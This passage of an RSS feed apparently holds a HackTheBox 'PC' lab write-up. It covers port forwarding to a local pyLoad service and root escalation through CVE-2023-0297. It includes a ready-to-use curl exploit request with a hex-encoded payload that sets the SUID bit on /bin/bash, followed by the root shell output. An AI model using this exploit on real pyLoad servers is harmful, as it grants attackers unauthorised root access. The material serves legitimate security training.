+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sau@pc:~$ netstat -ntlp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Not all processes could be identified, non-owned process info
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; will not be shown, you would have to be root to see it all.&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Active Internet connections &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;only servers&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::50051                :::*                    LISTEN      -                   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tcp6       &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; :::22                   :::*                    LISTEN      -                   
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Port 8000 is common for web applications. We can do a very fast and easy check with a &lt;code&gt;curl&lt;/code&gt; request:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sau@pc:~$ curl localhost:8000
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;!doctype html&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html &lt;span class=&#34;nv&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;en&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;title&amp;gt;Redirecting...&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;h1&amp;gt;Redirecting...&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;p&amp;gt;You should be redirected automatically to the target URL: &amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/login?next=http%3A%2F%2Flocalhost%3A8000%2F&amp;#34;&lt;/span&gt;&amp;gt;/login?next&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http%3A%2F%2Flocalhost%3A8000%2F&amp;lt;/a&amp;gt;. If not, click the link.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;There is a webpage here, and we can see already that there is login involved. In order to get a better view, we can utilize ssh port forwarding:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ssh -L 8000:localhost:8000 sau@10.10.11.214
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Now when we visit &lt;code&gt;localhost:8000&lt;/code&gt; in our browser, we can see the web login page:
+&lt;img src=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/20230520223533.png&#34;
+	width=&#34;640&#34;
+	height=&#34;368&#34;
+	srcset=&#34;https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/20230520223533_hubadcb70170cbaa2a8691f6ee6892fc7c_12291_480x0_resize_box_3.png 480w, https://yuwenmichael.netlify.app/post/hackthebox-pc/Images/20230520223533_hubadcb70170cbaa2a8691f6ee6892fc7c_12291_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;173&#34;
+		data-flex-basis=&#34;417px&#34;
+	
+&gt;
+A few basic credential attempts did not work.&lt;/p&gt;
+&lt;h3 id=&#34;rce-as-root-from-pyload-vulnerability-cve-2023-0297&#34;&gt;RCE as root from pyLoad vulnerability (CVE-2023-0297)&lt;/h3&gt;
+&lt;p&gt;Searching a little more, I find &lt;a class=&#34;link&#34; href=&#34;https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;this report on unauthenticated RCE in pyLoad&lt;/a&gt;. Although I wasn&amp;rsquo;t finding an easy way to see pyLoad&amp;rsquo;s version number, the exploit does not seem volitile, and so I gave it a shot. Note that the payload has been altered to be &lt;code&gt;pyimport os;os.system(&amp;quot;chmod +s /bin/bash&amp;quot;)&lt;/code&gt;, which is different from the article.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -s -k -X &lt;span class=&#34;s1&#34;&gt;$&amp;#39;POST&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: 127.0.0.1:8000&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Content-Length: 184&amp;#39;&lt;/span&gt; --data-binary &lt;span class=&#34;s1&#34;&gt;$&amp;#39;package=xxx&amp;amp;crypted=AAAA&amp;amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&amp;amp;passwords=aaaa&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;$&amp;#39;http://127.0.0.1:8000/flash/addcrypted2&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Executing the command as user &lt;code&gt;sau&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sau@pc:/opt/app$ curl -i -s -k -X &lt;span class=&#34;s1&#34;&gt;$&amp;#39;POST&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Host: 127.0.0.1:8000&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;$&amp;#39;Content-Length: 184&amp;#39;&lt;/span&gt; --data-binary &lt;span class=&#34;s1&#34;&gt;$&amp;#39;package=xxx&amp;amp;crypted=AAAA&amp;amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&amp;amp;passwords=aaaa&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;$&amp;#39;http://127.0.0.1:8000/flash/addcrypted2&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;500&lt;/span&gt; INTERNAL SERVER ERROR
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Max-Age: &lt;span class=&#34;m&#34;&gt;1800&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Allow-Origin: *
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Allow-Methods: OPTIONS, GET, POST
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Vary: Accept-Encoding
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Date: Thu, &lt;span class=&#34;m&#34;&gt;05&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;2023&lt;/span&gt; 01:35:19 GMT
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Server: Cheroot/8.6.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Could not decrypt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sau@pc:/opt/app$ bash -p
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bash-5.0# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Looks like pyLoad is vulnerable, and we are now root!&lt;/p&gt;
+&lt;h2 id=&#34;reflection&#34;&gt;Reflection&lt;/h2&gt;
+&lt;p&gt;I found this box to be simple and clean, without much distractions. Interacting with gRPC was the biggest challenge, and I still find it annoying that using grpc-cli was so problematic. However, once the worst is passed, exploiting the vulnerabilities was quite stress-free.&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
